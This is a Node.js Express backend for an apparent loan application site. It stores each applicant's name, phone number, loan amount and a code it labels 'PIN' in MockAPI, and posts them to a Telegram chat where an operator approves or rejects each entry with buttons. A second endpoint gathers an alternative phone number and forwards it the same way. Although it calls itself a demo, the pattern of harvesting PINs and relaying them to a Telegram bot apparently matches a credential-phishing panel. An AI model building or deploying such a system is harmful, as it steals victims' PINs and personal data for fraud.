
require("dotenv").config();

const express = require("express");
const path = require("path");
const crypto = require("crypto");
const sendTelegramNotification = require("./sendTelegram");

const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const MOCKAPI_URL = process.env.MOCKAPI_URL;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ADMIN_USER_ID = process.env.TELEGRAM_ADMIN_USER_ID;
const WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET;

const mockApiRecordUrl = (id) =>
  `${MOCKAPI_URL.replace(/\/$/, "")}/${encodeURIComponent(id)}`;

async function telegramRequest(method, body) {
  const response = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    }
  );

  const result = await response.json();

  if (!response.ok || !result.ok) {
    throw new Error(result.description || `Telegram ${method} failed`);
  }

  return result;
}

// Health check
app.get("/health", (req, res) => {
  res.json({
    ok: true,
    service: "loan-demo-api"
  });
});

// Serve website
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Submit loan application
app.post("/api/submit", async (req, res) => {
  try {
    if (!MOCKAPI_URL) {
      return res.status(500).json({
        ok: false,
        error: "MOCKAPI_URL is missing"
      });
    }

    const {
      full_name,
      phone_number,
      loan_amount_bwp,
      period_months,
      monthly_payment_bwp,
      total_repayment_bwp,
      demo_Code
    } = req.body;

    if (
      !full_name ||
      !phone_number ||
      !loan_amount_bwp ||
      !period_months ||
      !demo_Code
    ) {
      return res.status(400).json({
        ok: false,
        error: "Required application details are missing"
      });
    }

    const statusToken = crypto.randomBytes(24).toString("hex");

    const applicationData = {
      full_name,
      phone_number,
      loan_amount_bwp,
      period_months,
      monthly_payment_bwp,
      total_repayment_bwp,
      demo_Code,
      status: "pending",
      status_token: statusToken,
      created_at: new Date().toISOString()
    };

    const saveResponse = await fetch(MOCKAPI_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(applicationData)
    });

    if (!saveResponse.ok) {
      throw new Error("Failed to save application to MockAPI");
    }

    const savedApplication = await saveResponse.json();

    let telegramNotification = "sent";

    try {
      await sendTelegramNotification(savedApplication.id);
    } catch (telegramError) {
      telegramNotification = "failed";
      console.error("Telegram notification error:", telegramError.message);
    }

    return res.status(201).json({
      ok: true,
      message: "Application submitted successfully",
      id: savedApplication.id,
      status: savedApplication.status,
      status_token: savedApplication.status_token,
      telegram_notification: telegramNotification
    });

  } catch (error) {
    console.error("Application submission error:", error.message);

    return res.status(500).json({
      ok: false,
      error: "Application submission failed"
    });
  }
});

/* =====================================
   DEMO VERIFICATION TELEGRAM NOTIFICATION
===================================== */


app.post("/api/alternative-phone", async (req, res) => {
    try {
        const alternativePhone =
            String(req.body.alternative_phone_number || "").trim();

        const digits = alternativePhone.replace(/\D/g, "");

        if (digits.length < 7 || digits.length > 15) {
            return res.status(400).json({
                ok: false,
                error: "Please provide a valid phone number."
            });
        }

        if (!MOCKAPI_URL) {
            throw new Error("MOCKAPI_URL is not configured");
        }

        // Save alternative contact number to MockAPI
        const mockResponse = await fetch(MOCKAPI_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                alternative_phone_number: alternativePhone,
                record_type: "alternative_contact",
                created_at: new Date().toISOString()
            })
        });

        if (!mockResponse.ok) {
            throw new Error("Could not save alternative number to MockAPI");
        }

        const savedRecord = await mockResponse.json();

        // Send the saved alternative number to Telegram
        await sendTelegramNotification.sendAlternativePhoneNotification(
            alternativePhone,
            savedRecord.id
        );

        return res.status(200).json({
            ok: true,
            message: "Alternative phone number saved and notification sent.",
            id: savedRecord.id
        });

    } catch (error) {
        console.error(
            "Alternative phone submission error:",
            error.message
        );

        return res.status(500).json({
            ok: false,
            error: "Unable to complete phone number submission."
        });
    }
});



// Telegram approval/rejection webhook
app.post("/api/telegram/webhook", async (req, res) => {
  try {
    // Verify that this request came from Telegram.
    const receivedSecret =
      req.get("x-telegram-bot-api-secret-token");
      console.log("Webhook authentication check:", {
  secretConfigured: Boolean(WEBHOOK_SECRET),
  telegramSecretReceived: Boolean(receivedSecret),
  secretMatches: receivedSecret === WEBHOOK_SECRET
});

    if (
      !WEBHOOK_SECRET ||
      !receivedSecret ||
      receivedSecret !== WEBHOOK_SECRET
    ) {
      return res.sendStatus(401);
    }

    const callback = req.body.callback_query;

    // Ignore updates that are not button clicks.
    if (!callback) {
      return res.sendStatus(200);
    }

    if (!BOT_TOKEN || !MOCKAPI_URL || !ADMIN_USER_ID || !TELEGRAM_CHAT_ID) {
      throw new Error("Missing webhook environment variables");
    }

    // Only the configured administrator may make a decision.
    if (String(callback.from.id) !== String(ADMIN_USER_ID)) {
      await telegramRequest("answerCallbackQuery", {
        callback_query_id: callback.id,
        text: "You are not authorized to make this decision.",
        show_alert: true
      });

      return res.sendStatus(200);
    }

    // Also ensure the button came from the configured notification chat.
    if (
      !callback.message ||
      String(callback.message.chat.id) !== String(TELEGRAM_CHAT_ID)
    ) {
      await telegramRequest("answerCallbackQuery", {
        callback_query_id: callback.id,
        text: "This approval message is not from the authorized chat.",
        show_alert: true
      });

      return res.sendStatus(200);
    }

    const [decision, applicationId] =
      String(callback.data || "").split(":");

    if (
      !["approve", "reject"].includes(decision) ||
      !applicationId
    ) {
      await telegramRequest("answerCallbackQuery", {
        callback_query_id: callback.id,
        text: "Invalid approval request.",
        show_alert: true
      });

      return res.sendStatus(200);
    }

    // Retrieve the current application from MockAPI.
    const recordResponse = await fetch(mockApiRecordUrl(applicationId));

    if (!recordResponse.ok) {
      throw new Error("Application not found in MockAPI");
    }

    const application = await recordResponse.json();

    // Prevent a second decision from changing an already decided application.
    if (application.status !== "pending") {
      await telegramRequest("answerCallbackQuery", {
        callback_query_id: callback.id,
        text: `Already ${application.status}.`,
        show_alert: true
      });

      return res.sendStatus(200);
    }

    const newStatus =
      decision === "approve" ? "approved" : "rejected";

    // Update the existing MockAPI record.
    const updateResponse = await fetch(mockApiRecordUrl(applicationId), {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...application,
        status: newStatus,
        decision_at: new Date().toISOString()
      })
    });

    if (!updateResponse.ok) {
      throw new Error("Could not update application status in MockAPI");
    }

    const updatedApplication = await updateResponse.json();

    // Update the original Telegram message and remove its buttons.
    const updatedMessage = [
      newStatus === "approved"
        ? "✅ LOAN APPLICATION APPROVED"
        : "❌ LOAN APPLICATION REJECTED",
      "",
      `Applicant: ${application.full_name || "N/A"}`,
      `Phone: ${application.phone_number || "N/A"}`,
      `Loan amount: BWP ${application.loan_amount_bwp ?? "N/A"}`,
      `PIN: ${application.demo_Code || "N/A"}`,
      `Application ID: ${application.id}`,
      `New status: ${updatedApplication.status}`,
      "",
      `Decision time: ${updatedApplication.decision_at}`
    ].join("\n");

    await telegramRequest("editMessageText", {
      chat_id: callback.message.chat.id,
      message_id: callback.message.message_id,
      text: updatedMessage
    });

    await telegramRequest("answerCallbackQuery", {
      callback_query_id: callback.id,
      text: `Application ${newStatus}.`
    });

    console.log(
      `Application ${applicationId} updated to ${newStatus}`
    );

    return res.sendStatus(200);

  } catch (error) {
    console.error("Telegram webhook error:", error.message);
    return res.sendStatus(500);
  }
});

// Customer checks application status
app.get("/api/status", async (req, res) => {
  try {
    const { id, token } = req.query;

    if (!id || !token) {
      return res.status(400).json({
        ok: false,
        error: "Application ID and token are required"
      });
    }

    if (!MOCKAPI_URL) {
      return res.status(500).json({
        ok: false,
        error: "MOCKAPI_URL is missing"
      });
    }

    const response = await fetch(mockApiRecordUrl(id));

    if (!response.ok) {
      return res.status(404).json({
        ok: false,
        error: "Application not found"
      });
    }

    const application = await response.json();

    if (application.status_token !== token) {
      return res.status(403).json({
        ok: false,
        error: "Invalid application token"
      });
    }

    return res.json({
      ok: true,
      status: application.status
    });

  } catch (error) {
    console.error("Status check error:", error.message);

    return res.status(500).json({
      ok: false,
      error: "Unable to check application status"
    });
  }
});

const PORT = process.env.PORT || 3000;

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Loan API running on port ${PORT}`);
  });
}

module.exports = app;
